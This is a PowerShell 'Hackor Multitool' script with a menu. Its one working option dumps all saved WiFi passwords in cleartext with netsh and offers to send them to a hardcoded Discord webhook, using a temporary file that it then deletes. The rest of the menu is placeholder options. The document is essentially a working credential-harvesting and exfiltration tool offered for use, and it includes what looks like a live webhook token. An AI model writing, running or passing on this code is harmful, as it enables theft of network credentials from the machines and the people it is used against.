function Show-Menu {
    Clear-Host
    Write-Host @"
 ________  _______   ________  ________  _______   ________     
|\   ___ \|\  ___ \ |\   ___ \|\   ____\|\  ___ \ |\   ____\    
\ \  \_|\ \ \   __/|\ \  \_|\ \ \  \___|\ \   __/|\ \  \___|    
 \ \  \ \\ \ \  \_|/_\ \  \ \\ \ \_____  \ \  \_|/_\ \  \       
  \ \  \_\\ \ \  \_|\ \ \  \_\\ \|____|\  \ \  \_|\ \ \  \____  
   \ \_______\ \_______\ \_______\____\_\  \ \_______\ \_______\
    \|_______|\|_______|\|_______|\_________\|_______|\|_______|
                                 \|_________|                   
                                                                
                                                                
"@
    Write-Host "================ Hackor Multitool ================"
    Write-Host "1: List WiFi Passwords"
    Write-Host "2: Option Two"
    Write-Host "3: Option Three"
    Write-Host "Q: Quit"
    Write-Host "==========================================="
}

do {
    Show-Menu
    $selection = Read-Host "Please make a selection"
    switch ($selection) {
        '1' {
            Clear-Host
            Write-Host "================ Hackor Multitool -> WiFi Networks ================"
            Write-Host "Scanning saved WiFi Networks..."
            $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {$name=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | ForEach-Object {$pass=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
            Write-Host $wifiProfiles
            Write-Host "1: Send to webhook"
            Write-Host "2: Back"
            $selection2 = Read-Host "Please make a selection"
            switch ($selection2) {
                '1' {
                    $wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {$name=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | ForEach-Object {$pass=$_.Matches.Groups[1].Value.Trim(); $_} | ForEach-Object {[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
                    $filePath = "$env:TEMP/--wifi-pass.txt"
                    $wifiProfiles | Out-File -FilePath $filePath
                    
                    $webhookUrl = "https://discord.com/api/webhooks/1098750753935474800/XSUW-ZgqQmr3zD9FwL1W2iwbtoDBqvX9Y-SzpR6HFQxUgRYal7YdPYjxAsxJaHz2ev7J"
                    $fileContent = Get-Content -Path $filePath -Raw
                    $payload = @{
                        content = "WiFi Passwords:`n$fileContent"
                    } | ConvertTo-Json
                    try {
                        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
                    }
                    catch {
                        Write-Host "Failed to send data to webhook: $_"
                    }
                    finally {
                        Remove-Item -Path $filePath -ErrorAction SilentlyContinue
                    }
                }
                '2' {
                    # Do nothing, just go back to main menu
                }
            }
            pause
        }
        '2' {
            Write-Host "You chose Option Two"
            pause
        }
        '3' {
            Write-Host "You chose Option Three"
            pause
        }
        'q' {
            return
        }
    }
} while ($selection -ne 'q')